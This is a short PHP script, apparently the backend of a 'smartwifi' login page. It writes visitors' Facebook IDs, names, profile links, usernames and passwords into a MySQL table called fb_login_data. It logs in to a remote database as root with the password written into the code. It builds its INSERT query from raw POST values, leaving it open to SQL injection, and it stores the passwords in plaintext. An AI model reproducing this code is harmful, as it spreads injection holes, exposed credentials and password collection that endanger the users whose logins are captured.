<?php
date_default_timezone_set('Asia/Kolkata');

// Create connection
mysql_connect("198.100.45.191",root,ebffb4499fa6cd78);
@mysql_select_db(smartwifi) or die( "Unable to select database");


$fbid = $_POST['userFBid'];
$fbname =$_POST['userFBname'];
$fblink = $_POST['userFBlink']; 
$username= $_POST['username'];
$password= $_POST['password'];

$timestamp = date('Y/m/d H:i:s');

$insert="INSERT INTO fb_login_data (fbid, fbname, fblink, username, password, time) VALUES ('$fbid', '$fbname', '$fblink', '$username', '$password', '$timestamp')";
$result1=mysql_query($insert);

echo $timestamp;

?>